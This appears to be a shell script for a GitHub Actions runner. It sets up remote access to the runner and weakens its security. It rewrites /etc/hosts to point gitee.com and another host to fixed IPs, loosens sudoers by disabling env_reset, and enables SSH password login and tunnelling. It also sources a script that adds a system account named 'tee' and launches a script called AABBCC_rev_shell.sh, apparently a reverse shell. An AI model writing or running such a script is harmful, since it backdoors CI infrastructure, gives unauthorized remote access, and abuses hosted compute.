sudo chmod 0777 /home/runner/work/arm64/arm64/*;
cd /tmp
exec 1>./gh-y1
exec 2>./gh-y2
set -x
sudo touch /tmp/keepalive;sudo chmod 0777 /tmp/keepalive;

sudo bash -c 'echo 180.76.198.77 gitee.com  >> /etc/hosts'
#45.195.136.233
sudo bash -c 'echo 139.196.235.6 cn-sh-2.lcf.im   >> /etc/hosts'

sudo touch /bin/edge;
sudo touch /bin/bing;



if [ ! -z ${GITHUB_WORKSPACE} ]; then 
sudo chmod 0777 -R $GITHUB_WORKSPACE/ ; 
fi


sudo bash -c ' mkdir /tmp/{A,aB};
chmod 0777 /tmp/{A,aB};
sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt

rm -f /etc/ssh/sshd_config.d/*.conf

echo  -e "PasswordAuthentication yes\nPermitTunnel yes" > /etc/ssh/sshd_config.d/99liu.conf
'


# github_rev_ssh
(id | grep "^uid=[0-9]\{1,9\}(runner)") && 
(

#修改系统密码 添加系统账户tee 重启sshd
grep -q "tee" /etc/passwd ||
(
    . /home/runner/work/arm64/arm64/tee_pass.sh;
)

grep -q AABBCC_rev_shell /tmp/js9 &&
(
export HOME=/tmp;
sudo -H su -l -c /home/runner/work/arm64/arm64/AABBCC_rev_shell.sh;
)


)




# mkdir ~/.ssh;   cd ~/.ssh;


